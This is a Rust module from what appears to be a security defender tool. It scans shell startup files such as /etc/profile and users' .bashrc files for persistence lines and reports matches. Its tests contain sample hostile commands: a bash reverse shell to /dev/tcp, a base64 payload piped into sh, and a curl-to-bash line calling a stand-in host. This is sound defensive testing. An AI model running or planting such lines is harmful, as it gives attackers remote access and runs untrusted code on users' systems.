//! Shell startup files.
//!
//! Every dotfile a shell sources on login is a persistence slot. This checks
//! the system-wide files and each login-capable account's own, reporting only
//! lines that match a known-dangerous pattern rather than every line present.

use std::path::{Path, PathBuf};

use crate::core::scan::{effective_line, read_text_file, suspicious_matches};
use crate::core::{DefenderContext, Result, collect_accounts};

/// Files sourced for all users.
const SYSTEM_FILES: &[&str] = &[
    "/etc/profile",
    "/etc/bash.bashrc",
    "/etc/bashrc",
    "/etc/zsh/zshrc",
    "/etc/csh.cshrc",
];

/// Drop-in directory sourced by `/etc/profile`.
const SYSTEM_DIR: &str = "/etc/profile.d";

/// Per-account dotfiles, relative to the account's home directory.
const USER_FILES: &[&str] = &[
    ".bashrc",
    ".bash_profile",
    ".bash_login",
    ".bash_logout",
    ".profile",
    ".zshrc",
    ".zprofile",
    ".zlogin",
];

/// A dangerous-looking line in a shell startup file.
pub struct Hit {
    /// Startup file the line appears in.
    pub file: PathBuf,
    /// The line itself.
    pub line: String,
    /// Why it was flagged.
    pub reasons: Vec<&'static str>,
}

/// Scan system and per-user shell startup files for dangerous lines.
pub fn run(ctx: &DefenderContext) -> Result {
    let mut targets: Vec<PathBuf> = SYSTEM_FILES.iter().map(PathBuf::from).collect();

    if let Ok(entries) = std::fs::read_dir(SYSTEM_DIR) {
        targets.extend(entries.filter_map(|e| e.ok()).map(|e| e.path()));
    }

    for account in collect_accounts()?.iter().filter(|a| a.can_log_in()) {
        targets.extend(USER_FILES.iter().map(|f| account.home.join(f)));
    }

    ctx.debug(&format!("Checking {} startup file(s)", targets.len()));

    let mut hits = Vec::new();
    for target in &targets {
        hits.extend(inspect_file(target));
    }

    if hits.is_empty() {
        println!("[✓] No suspicious lines in any shell startup file");
        return Ok(());
    }

    println!(
        "[!] {} suspicious line(s) in shell startup files:",
        hits.len()
    );
    for hit in &hits {
        println!("    {}", hit.file.display());
        println!("      {}", hit.line);
        println!("      [!] {}", hit.reasons.join(", "));
    }
    println!("[!] Startup files are not auto-edited — remove the offending lines by hand.");

    Ok(())
}

/// Dangerous lines in one startup file, if it can be read.
fn inspect_file(path: &Path) -> Vec<Hit> {
    let Some(contents) = read_text_file(path) else {
        return Vec::new();
    };

    inspect(&contents)
        .into_iter()
        .map(|(line, reasons)| Hit {
            file: path.to_path_buf(),
            line,
            reasons,
        })
        .collect()
}

/// Lines matching a dangerous pattern, with the reasons they matched.
fn inspect(contents: &str) -> Vec<(String, Vec<&'static str>)> {
    contents
        .lines()
        .filter_map(effective_line)
        .filter_map(|line| {
            let reasons = suspicious_matches(line);
            if reasons.is_empty() {
                None
            } else {
                Some((line.to_string(), reasons))
            }
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn an_ordinary_bashrc_is_clean() {
        let bashrc = "\
# ~/.bashrc
export EDITOR=vim
alias ll='ls -la'
export PATH=$PATH:$HOME/.local/bin
[ -f ~/.bash_aliases ] && . ~/.bash_aliases
";
        assert!(inspect(bashrc).is_empty());
    }

    #[test]
    fn finds_an_appended_reverse_shell() {
        let bashrc = "export EDITOR=vim\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1 &\n";
        let hits = inspect(bashrc);

        assert_eq!(hits.len(), 1);
        assert!(
            hits[0]
                .1
                .contains(&"bash network redirection (reverse shell)")
        );
    }

    #[test]
    fn finds_an_obfuscated_payload() {
        let hits = inspect("echo cGF5bG9hZA== | base64 -d | sh\n");

        assert_eq!(hits.len(), 1);
        assert!(hits[0].1.contains(&"base64 decoding (obfuscation)"));
        assert!(hits[0].1.contains(&"pipes output into a shell"));
    }

    #[test]
    fn a_commented_out_payload_is_not_flagged() {
        assert!(inspect("# curl http://evil.test/x.sh | bash\n").is_empty());
    }
}
